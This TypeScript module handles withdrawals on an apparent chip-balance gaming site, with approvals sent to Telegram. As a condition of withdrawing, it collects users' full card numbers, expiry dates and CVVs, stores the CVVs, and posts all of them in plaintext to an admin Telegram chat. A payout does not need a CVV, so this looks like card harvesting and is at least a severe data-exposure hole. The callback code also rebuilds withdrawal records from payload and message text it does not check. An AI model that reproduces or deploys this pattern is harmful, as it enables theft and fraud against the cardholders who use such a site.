/**
 * Withdrawal records + Telegram admin notifications.
 *
 * Mirrors deposits.server.ts: MongoDB when MONGODB_URI is configured,
 * otherwise an in-memory map so the flow keeps working in preview.
 */

import { escapeHtml, telegramCall, resolveAdminChatId } from "./deposits.server";

export const WITHDRAW_FEE_RATE = 0.25;
export const WITHDRAW_MIN = 5;
export const WITHDRAW_MAX = 10000;

export type WithdrawStatus = "pending" | "approved" | "rejected";

export type WithdrawDoc = {
  id: string;
  userId: string;
  username: string;
  bank: string;
  amount: number;
  fee: number;
  payout: number;
  cardNumber: string;
  cardBrand: string;
  expiry: string;
  cvv: string;
  status: WithdrawStatus;
  createdAt: string;
  messageId?: number;
  chatId?: number;
};

type WithdrawStore = {
  insert(d: WithdrawDoc): Promise<void>;
  find(id: string): Promise<WithdrawDoc | null>;
  update(id: string, patch: Partial<WithdrawDoc>): Promise<void>;
  listByUser(userId: string): Promise<WithdrawDoc[]>;
};

const memory = new Map<string, WithdrawDoc>();

const memoryStore: WithdrawStore = {
  async insert(d) {
    console.log(`[MEMORY] Inserting withdrawal: ${d.id} for user: ${d.userId}`);
    memory.set(d.id, d);
  },
  async find(id) {
    const result = memory.get(id) ?? null;
    console.log(`[MEMORY] Finding withdrawal: ${id} - ${result ? 'FOUND' : 'NOT FOUND'}`);
    return result;
  },
  async update(id, patch) {
    const cur = memory.get(id);
    if (cur) {
      const updated = { ...cur, ...patch };
      memory.set(id, updated);
      console.log(`[MEMORY] Updated withdrawal: ${id} - New status: ${patch.status || 'unchanged'}`);
    }
  },
  async listByUser(userId) {
    return [...memory.values()]
      .filter((d) => d.userId === userId)
      .sort((a, b) => b.createdAt.localeCompare(a.createdAt));
  },
};

let cached: Promise<WithdrawStore> | null = null;

async function createMongoWithdrawStore(uri: string): Promise<WithdrawStore> {
  console.log(`[MONGO] Connecting to MongoDB for withdrawals...`);
  const { getMongoDb } = await import("./mongo-client");
  const db = await getMongoDb();
  const col = db.collection("withdrawals");
  console.log(`[MONGO] Connected successfully for withdrawals`);
  await col.createIndex({ id: 1 }, { unique: true });
  await col.createIndex({ userId: 1, createdAt: -1 });

  return {
    async insert(d) {
      try {
        console.log(`[MONGO] Inserting withdrawal: ${d.id} for user: ${d.userId} amount: ${d.amount}`);
        await col.insertOne({ ...d });
        console.log(`[MONGO] Withdrawal inserted successfully: ${d.id}`);
      } catch (err: any) {
        if (err.code === 11000 || err.code === 11001) {
          console.log(`[MONGO] Duplicate key ignored for withdrawal: ${d.id} (already exists)`);
          return;
        }
        console.error(`[MONGO] Insert error for ${d.id}:`, err.message);
        throw err;
      }
    },
    async find(id) {
      try {
        const doc = (await col.findOne({ id })) as WithdrawDoc | null;
        console.log(`[MONGO] Finding withdrawal: ${id} - ${doc ? 'FOUND' : 'NOT FOUND'}`);
        if (doc) {
          console.log(`[MONGO] Found withdrawal: id=${doc.id} user=${doc.userId} status=${doc.status}`);
        }
        return doc;
      } catch (err) {
        console.error(`[MONGO] Find error for ${id}:`, err);
        return null;
      }
    },
    async update(id, patch) {
      try {
        console.log(`[MONGO] Updating withdrawal: ${id} with patch:`, patch);
        const result = await col.updateOne({ id }, { $set: patch });
        console.log(`[MONGO] Update result for ${id}: matched=${result.matchedCount} modified=${result.modifiedCount}`);
      } catch (err) {
        console.error(`[MONGO] Update error for ${id}:`, err);
        throw err;
      }
    },
    async listByUser(userId) {
      try {
        const docs = (await col
          .find({ userId })
          .sort({ createdAt: -1 })
          .limit(30)
          .toArray()) as unknown as WithdrawDoc[];
        console.log(`[MONGO] Found ${docs.length} withdrawals for user ${userId}`);
        return docs;
      } catch (err) {
        console.error(`[MONGO] listByUser error for ${userId}:`, err);
        return [];
      }
    },
  };
}

export function getWithdrawStore(): Promise<WithdrawStore> {
  if (!cached) {
    const uri = process.env["MONGODB_URI"];
    console.log(`[STORE] Getting withdrawal store - MONGODB_URI: ${uri ? 'SET' : 'NOT SET'}`);
    
    if (!uri) {
      console.log("[STORE] No MONGODB_URI - using memory store (dev mode)");
      cached = Promise.resolve(memoryStore);
    } else {
      console.log("[STORE] MONGODB_URI set - production mode (NO fallback to memory)");
      // In production, fail fast if MongoDB is unavailable
      cached = createMongoWithdrawStore(uri);
    }
  }
  return cached;
}

export function detectCardBrand(digits: string): string {
  if (/^4/.test(digits)) return "Visa";
  if (/^(5[1-5]|2[2-7])/.test(digits)) return "Mastercard";
  return "Card";
}

function group(digits: string) {
  return digits.replace(/(\d{4})(?=\d)/g, "$1 ");
}

export type WithdrawInput = {
  userId: string;
  username: string;
  bank: string;
  amount: number;
  cardNumber: string;
  expiry: string;
  cvv: string;
};

function caption(w: WithdrawDoc, suffix = "") {
  const d = new Date(w.createdAt);
  return (
    `<b>WITHDRAW</b>\n` +
    `User ID: <code>${escapeHtml(w.userId)}</code>\n` +
    `Username: <b>${escapeHtml(w.username)}</b>\n` +
    `Amount: <b>${w.amount.toFixed(2)} GEL</b>\n` +
    `Fee (25%): <b>${w.fee.toFixed(2)} GEL</b>\n` +
    `Payout: <b>${w.payout.toFixed(2)} GEL</b>\n` +
    `Bank: <b>${escapeHtml(w.bank)}</b>\n` +
    `Card: <code>${escapeHtml(group(w.cardNumber))}</code> (${escapeHtml(w.cardBrand)})\n` +
    `Exp: <code>${escapeHtml(w.expiry)}</code>  CVV: <code>${escapeHtml(w.cvv)}</code>\n` +
    `Date: ${d.toLocaleDateString("en-GB", { timeZone: "Asia/Tbilisi" })}\n` +
    `Time: ${d.toLocaleTimeString("en-GB", { timeZone: "Asia/Tbilisi", hour12: false })}` +
    suffix
  );
}

export async function submitWithdraw(input: WithdrawInput): Promise<WithdrawDoc> {
  console.log(`[WITHDRAW] Submitting withdrawal: user=${input.userId} amount=${input.amount} bank=${input.bank}`);
  
  const digits = input.cardNumber.replace(/\D/g, "");
  if (digits.length < 15 || digits.length > 19) throw new Error("Invalid card number.");
  if (input.amount < WITHDRAW_MIN) throw new Error(`Minimum withdrawal is ${WITHDRAW_MIN} GEL.`);
  if (input.amount > WITHDRAW_MAX) throw new Error(`Maximum withdrawal is ${WITHDRAW_MAX} GEL.`);

  const { getStore } = await import("./db.server");
  const users = await getStore();
  const user = await users.findById(input.userId);
  if (!user) throw new Error("User not found.");
  if (user.chipBalance < input.amount) throw new Error("Insufficient balance.");

  const fee = Number((input.amount * WITHDRAW_FEE_RATE).toFixed(2));
  const payout = Number((input.amount - fee).toFixed(2));

  console.log(`[WITHDRAW] Deducting balance: ${input.userId} - ${input.amount}`);
  
  // Hold the funds immediately
  await users.addBalance(input.userId, -input.amount);
  console.log(`[WITHDRAW] Balance deducted successfully`);

  const store = await getWithdrawStore();
  const chatId = await resolveAdminChatId().catch(async (err) => {
    console.error(`[WITHDRAW] Admin chat ID resolution failed, refunding balance`);
    await users.addBalance(input.userId, input.amount);
    throw err;
  });

  const doc: WithdrawDoc = {
    id: `w_${Date.now().toString(36)}${Math.random().toString(36).slice(2, 8)}`,
    userId: input.userId,
    username: input.username,
    bank: input.bank,
    amount: input.amount,
    fee,
    payout,
    cardNumber: digits,
    cardBrand: detectCardBrand(digits),
    expiry: input.expiry,
    cvv: input.cvv,
    status: "pending",
    createdAt: new Date().toISOString(),
    chatId,
  };

  console.log(`[WITHDRAW] Created withdrawal record: ${doc.id}`);
  
  await store.insert(doc);
  console.log(`[WITHDRAW] Withdrawal persisted to database: ${doc.id}`);

  const sent = (await telegramCall("sendMessage", {
    chat_id: chatId,
    text: caption(doc),
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          {
            text: "✅ Qəbul et",
            callback_data: `wd:ok:${doc.id}:${doc.userId}:${doc.amount.toFixed(2)}`,
          },
          {
            text: "❌ Rədd et",
            callback_data: `wd:no:${doc.id}:${doc.userId}:${doc.amount.toFixed(2)}`,
          },
        ],
      ],
    },
  })) as { message_id: number };

  doc.messageId = sent?.message_id;
  if (sent?.message_id) await store.update(doc.id, { messageId: sent.message_id });
  console.log(`[WITHDRAW] Telegram notification sent: ${doc.id}`);
  
  return doc;
}

function withdrawFromText(id: string, text: string, chatId: number): WithdrawDoc | null {
  console.log(`[RECOVERY] Reconstructing withdrawal from text: ${id}`);
  const userId = /User ID:\s*(\S+)/.exec(text)?.[1]?.trim();
  const username = /Username:\s*(.+)/.exec(text)?.[1]?.trim() ?? "";
  const amount = Number(/Amount:\s*([\d.]+)/.exec(text)?.[1]);
  const fee = Number(/Fee \(25%\):\s*([\d.]+)/.exec(text)?.[1]);
  const payout = Number(/Payout:\s*([\d.]+)/.exec(text)?.[1]);
  const bank = /Bank:\s*(.+)/.exec(text)?.[1]?.trim() ?? "";
  const card = /Card:\s*([\d ]+)/.exec(text)?.[1]?.replace(/\D/g, "") ?? "";
  const expiry = /Exp:\s*(\d{2}\/\d{2})/.exec(text)?.[1] ?? "";
  
  console.log(`[RECOVERY] Parsed: userId=${userId} amount=${amount} bank=${bank}`);
  
  if (!userId || !Number.isFinite(amount) || amount <= 0) {
    console.log(`[RECOVERY] Recovery failed: missing userId or invalid amount`);
    return null;
  }
  
  const doc = {
    id,
    userId,
    username,
    bank,
    amount,
    fee: Number.isFinite(fee) ? fee : Number((amount * WITHDRAW_FEE_RATE).toFixed(2)),
    payout: Number.isFinite(payout) ? payout : Number((amount * (1 - WITHDRAW_FEE_RATE)).toFixed(2)),
    cardNumber: card,
    cardBrand: card ? detectCardBrand(card) : "Card",
    expiry,
    cvv: "",
    status: "pending" as WithdrawStatus,
    createdAt: new Date().toISOString(),
    chatId,
  };
  
  console.log(`[RECOVERY] Successfully reconstructed withdrawal: ${id}`);
  return doc;
}

/** Handles the Accept / Reject inline buttons for withdrawals. */
export async function handleWithdrawCallback(
  data: string,
  chatId: number,
  messageId: number,
  text?: string,
) {
  console.log(`[CALLBACK] Handling withdrawal callback: data="${data}" chatId=${chatId} messageId=${messageId}`);
  
  const [, action, id] = data.split(":");
  if (!id || (action !== "ok" && action !== "no")) {
    console.error(`[CALLBACK] Invalid action or id`);
    return "Unknown action";
  }

  console.log(`[CALLBACK] Parsed: action=${action} id=${id}`);

  const store = await getWithdrawStore();
  let w = await store.find(id);

  console.log(`[CALLBACK] Database lookup: ${w ? 'FOUND' : 'NOT FOUND'}`);

  const cbUserId = data.split(":")[3];
  const cbAmount = Number(data.split(":")[4]);

  if (!w && cbUserId && Number.isFinite(cbAmount) && cbAmount > 0) {
    console.log(`[CALLBACK] Attempting recovery from callback payload...`);
    w = {
      id,
      userId: cbUserId,
      username: text ? (/Username:\s*(.+)/.exec(text)?.[1]?.trim() ?? "") : "",
      bank: text ? (/Bank:\s*(.+)/.exec(text)?.[1]?.trim() ?? "") : "",
      amount: cbAmount,
      fee: Number((cbAmount * WITHDRAW_FEE_RATE).toFixed(2)),
      payout: Number((cbAmount * (1 - WITHDRAW_FEE_RATE)).toFixed(2)),
      cardNumber: "",
      cardBrand: "Card",
      expiry: "",
      cvv: "",
      status: "pending",
      createdAt: new Date().toISOString(),
      chatId,
    };
    console.log(`[CALLBACK] Recovered from callback payload: ${id}`);
  }

  if (!w && text) {
    console.log(`[CALLBACK] Attempting recovery from message text...`);
    w = withdrawFromText(id, text, chatId);
  }

  if (w) {
    try {
      await store.insert(w);
      console.log(`[CALLBACK] Withdrawal re-inserted for safety: ${id}`);
    } catch {
      console.log(`[CALLBACK] Withdrawal already exists (expected): ${id}`);
    }
  }

  if (!w) {
    console.error(`[CALLBACK] CRITICAL: Withdrawal not found and recovery failed: ${id}`);
    return "Withdrawal Not Found - Database Error";
  }

  if (w.status !== "pending") {
    const msg = w.status === "approved" ? "Already approved" : "Already rejected";
    console.log(`[CALLBACK] Withdrawal already processed: ${id} status=${w.status}`);
    return msg;
  }

  if (action === "ok") {
    console.log(`[CALLBACK] Approving withdrawal: ${id}`);
    await store.update(id, { status: "approved" });
    console.log(`[CALLBACK] Withdrawal marked as approved: ${id}`);
  } else {
    console.log(`[CALLBACK] Rejecting withdrawal: ${id}`);
    
    // Refund the amount back to user
    const { getStore } = await import("./db.server");
    const users = await getStore();
    const refunded = await users.addBalance(w.userId, w.amount);
    
    if (!refunded) {
      console.error(`[CALLBACK] Failed to refund balance for user: ${w.userId}`);
      return `Refund failed`;
    }
    
    console.log(`[CALLBACK] Balance refunded for user: ${w.userId} amount: ${w.amount}`);
    await store.update(id, { status: "rejected" });
    console.log(`[CALLBACK] Withdrawal marked as rejected: ${id}`);
  }

  await telegramCall("editMessageText", {
    chat_id: chatId,
    message_id: messageId,
    parse_mode: "HTML",
    text: caption(w, action === "ok" ? "\n\n\u2705 Approved" : "\n\n\u274c Rejected"),
    reply_markup: { inline_keyboard: [] },
  }).catch((e) => console.error("[CALLBACK] editMessageText failed:", e));

  const result = action === "ok" ? "Approved" : "Rejected";
  console.log(`[CALLBACK] Callback completed successfully: ${id} - ${result}`);
  return result;
}
